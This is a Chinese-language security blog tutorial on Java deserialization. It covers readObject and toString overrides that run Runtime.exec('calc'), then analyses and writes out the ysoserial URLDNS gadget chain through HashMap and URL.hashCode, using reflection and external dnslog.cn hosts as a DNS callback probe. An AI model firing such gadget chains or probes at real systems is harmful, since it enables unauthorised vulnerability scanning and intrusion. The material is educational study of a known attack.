---
layout: post
date: 2025-3-26
title: "JAVA反序列化第一舞(URLDNS)"
author: "XinYiSleep"
category: Java
---
<h1 id="y1d2Y">一. 基础信息</h1>


<h3 id="z6QuK">1.1：反序列化概念和基础</h3>

```
php中的序列化函数serialize反序列化函数unserialize,但是在java中分别是序列化writeObject,
和反序列化readObject，在php反序列化中生成的数据是可以修改的，而在java中生成的数据是难以用人直接去修改的，
并且在java反序列化中，反序列化的类必须实现Serializable这个接口，而在序列化的时候不去实现会报错但并不影响进行序列化，下面是简单的一个案例。
```

```java
public class User implements Serializable{

    public String name="张三";

    private Integer age=12;

    public User(String name, Integer age)  {

        this.name = name;
        this.age = age;
        System.out.println(this.name+" "+this.age);
    }
//首先创建一个类，下面进行序列化，会生成一个ser.bin文件
public static void main(String[] args) throws Exception {
    User u = new User("李四", 18);
    serialize(u);

}
public static void serialize(Object obj) throws Exception {
    //序列化
    ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
    oos.writeObject(obj);

}
```
![](https://xinyisleep.github.io/img/2025/URLDNS/1.png)
```
上面可以看到生成的数据是难以手工修改的，下面进行反序列化,可以看到我们把属性输出的时候，
输出了上图的内容，实际上图会执行toString方法默认没写toString方法的时候执行父类的toString方法，父类也就是Object,虽然没写继承但是也会执行Object因为所有类默认都是继承的Object方法
下面我们在User类中重写toString方法，在进行反序列化输出的时候就会执行到我们重写的toString方法，可以看到我在toString方法中写了一个命令执行，我们重写序列化然后在进行反序列化就会执行到重写的toString
并且执行命令。
```
```java
public static void main(String[] args) throws Exception {

    Object unserialize = unserialize("ser.bin");
    System.out.println(unserialize);
}
public static Object unserialize(String name) throws Exception {
    //反序列化
    ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
    Object o = ois.readObject();
    return o;
}
```
![](https://xinyisleep.github.io/img/2025/URLDNS/2.png)
```java
@Override
public String toString() {
    try {
        Runtime.getRuntime().exec("calc");
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
    return "User{" +
            "name='" + name + '\'' +
            ", age=" + age +
            '}';
}
```
![](https://xinyisleep.github.io/img/2025/URLDNS/3.png)
<h3 id="rdI0E">1.2：重写readObject</h3>
```
这里就很有意思了，重写redaObject意思是说我们上面进行反序列化的是User类如果说上面User类中重写了readObject，
然后我们自己写的readObject就会走到User类中的readObject中，下面是代码和调试。
```

```java
public class User implements Serializable{

    public String name="张三";

    private Integer age=12;

    public User(String name, Integer age)  {

        this.name = name;
        this.age = age;
        System.out.println(this.name+" "+this.age);
    }


    private void readObject(ObjectInputStream ois) throws Exception{
        //指向正确的readObject
        ois.defaultReadObject();
        //命令执行
        Runtime.getRuntime().exec("calc");
    }
}
public class Main {
    public static void main(String[] args) throws Exception {
        User u = new User("李四", 18);
        serialize(u);
        Object unserialize = unserialize("ser.bin");
        System.out.println(unserialize);


    }
    public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }

}
```
![](https://xinyisleep.github.io/img/2025/URLDNS/4.png)
![](https://xinyisleep.github.io/img/2025/URLDNS/5.png)

<h3 id="EvfAi">1.3：URLDNS</h3>
<h4 id="tZdPq">1.3.1: 链子分析</h4>
```
URLDNS是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：
● 不限制jdk版本，使用Java内置类，对第三方依赖没有要求
● 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
● URLDNS利用链，只能发起DNS请求，并不能进行其他利用
```
```
在HashMap中存在重写了readObject并且实现了Serializable接口，下面用代码简单看一下,首先看看HashMap这个对象，并且在这个对象类中存在put方法跟进去看看，
可以看到获取了key和value,并且获取了key执行了hash函数，跟进去发现我们能控制执行任意类的hashCode方法(必须实现Serializble),这里用到Url这个类，执行到hashCode方法hashCode是一个受保护的属性，
handler是URLStreamHandler并且transient修饰符表示了在序列化的时候并不能修改这里，所有会执行到URLStreamHandler.hashCode方法中，并且我们传入的key就是this。
到了URLStreamHandler.hashCode方法发现我们的参数走到了getHostAddress(u)，跟进去看看
InetAddress.getByName(host); host就是我们控制的key,到这里其实就结束了，搜索一下就知道 这个是java官方的jdk手册可以知道是进行dns解析的，到此分析完毕。
```
![](https://xinyisleep.github.io/img/2025/URLDNS/6.png)
```java
HashMap类
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}

static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}

URL类
transient URLStreamHandler handler;
private int hashCode = -1;
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}


//URLStreamHandler类
protected int hashCode(URL u) {
    int h = 0;

    //获取协议
    String protocol = u.getProtocol();
    if (protocol != null)
        h += protocol.hashCode();

    
    InetAddress addr = getHostAddress(u);
//后面代码不重要

protected synchronized InetAddress getHostAddress(URL u) {
    if (u.hostAddress != null)
        return u.hostAddress;
    //获取host内容去掉协议
    String host = u.getHost();
    if (host == null || host.equals("")) {
        return null;
    } else {
        try {
            u.hostAddress = InetAddress.getByName(host);
//后面的不重要
```

![](https://xinyisleep.github.io/img/2025/URLDNS/7.png)

<h4 id="P7Mgs">1.3.2：链子编写</h4>
```java
//首先实例化HashMap这个类
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
//之后执行HashMap的pub方法，并且在这个方法中的参数让其执行到URL类
Object valve = objectObjectHashMap.put(new URL("http://z7f2rw.dnslog.cn"), "valve");
//进行序列化
serialize(objectObjectHashMap)
//反序列化unserialize
unserialize("ser.bin")
//这里存在一个问题就是 在进行序列化的时候存在请求，反序列化的时候没有进行请求，调试一次之后发现
//后面的hashCode不等于-1,这里就需要用到反射看下来案例。
public static void serialize(Object obj) throws Exception {
    //序列化
    ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
    oos.writeObject(obj);

}
public static Object unserialize(String name) throws Exception {
    //反序列化
    ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
    Object o = ois.readObject();
    return o;
}
```



```java
//加载URL类
Class<?> aClass = forName("java.net.URL");
//获取URL构造函数一个参数的构造函数并且是String
Constructor<?> constructor = aClass.getConstructor(String.class);
//获取URL对象执行构造方法
Object o = constructor.newInstance("http://z7f2rw.dnslog.cn");
//上面三行代码相当于 new URL("http://z7f2rw.dnslog.cn")
Field hashCode = aClass.getDeclaredField("hashCode");
//这里获取java.net.URL里面的hashCode属性
hashCode.setAccessible(true);
//设置权限,因为是private私有属性，设置成public
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
//这里就是开始进行反序列化，因为HaashMap里面重写了readObject反序列化函数
objectObjectHashMap.put(o,"value");
//这里为什么要用到put方法是因为，在重写的readObject里面存在hash函数，然而在put里面也存在hash函数
//完成跳板。
hashCode.set(o,-1);
//这里设置hashCode，第一个参数o也就是说设置URL对象的hashCode为-1
serialize(objectObjectHashMap);
//序列化
unserialize("ser.bin");
//反序列化


public static void serialize(Object obj) throws Exception {
    //序列化
    ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
    oos.writeObject(obj);

}
public static Object unserialize(String name) throws Exception {
    //反序列化
    ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
    Object o = ois.readObject();
    return o;
}
```

```
上面实在看不懂的可以看下面的,下面是我改动的，看注释。
```

```java
Class<?> aClass = Class.forName("java.net.URL");
//首先就是通过反射获取URL类
Field hashCode = aClass.getDeclaredField("hashCode");
hashCode.setAccessible(true);
//获取到hashCode并且设置可以修改的状态，修改它是因为在进行反序列化的时候这个值会改变导致不能达成效果
URL url = new URL("http://rkgdsy.dnslog.cn");
//上面案例是用反射写的，这里我简单一点就直接new了效果一样
hashCode.set(url, -1);
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
objectObjectHashMap.putIfAbsent(url, "test");
//唯一最大的区别就是putIfAbsent了为啥这里不一样是因为和put代码一样也调用了hash函数
serialize(objectObjectHashMap)
unserialize("ser.bin");
```

